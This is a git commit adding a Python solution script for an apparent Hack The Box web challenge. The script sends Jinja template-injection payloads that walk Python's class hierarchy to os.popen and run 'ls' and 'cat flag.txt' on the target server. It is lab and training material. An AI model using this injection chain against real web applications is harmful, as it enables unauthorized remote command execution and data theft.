79ba1be9033410371a2c257e22fe1a93a832a81d
ZZIDZZ <zidanutomo@gmail.com>
2022-01-09 10:11:54 +0700

    added HTB web templated

--- HTB/web_templated/tryCrack.py
+++ HTB/web_templated/tryCrack.py
@@ -1,6 +1,25 @@
-import requests
+# SSTI Jinja Injection
+import requests,html
 
-host = "http://178.62.96.143:32144"
-r = requests.get(host)
+# List all classes to map attack
+host = "http://178.62.74.50:30064/"
+payload = """{{"".__class__.__mro__[1].__subclasses__()}}"""
+r = requests.get(host+payload)
 
-answer = r
+print(html.unescape(r.text))
+
+# Found <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>
+# at [185] and [186], use either
+
+payload = """{{"".__class__.__mro__[1].__subclasses__()[186].__init__.\
+    __globals__.__builtins__.__import__('os').popen("ls *").read()}}"""
+r = requests.get(host+payload)
+
+print(html.unescape(r.text))
+
+# Found flag.txt, nyoice
+payload = """{{"".__class__.__mro__[1].__subclasses__()[186].__init__.\
+    __globals__.__builtins__.__import__('os').popen("cat flag.txt").read()}}"""
+r = requests.get(host+payload)
+
+print(html.unescape(r.text))
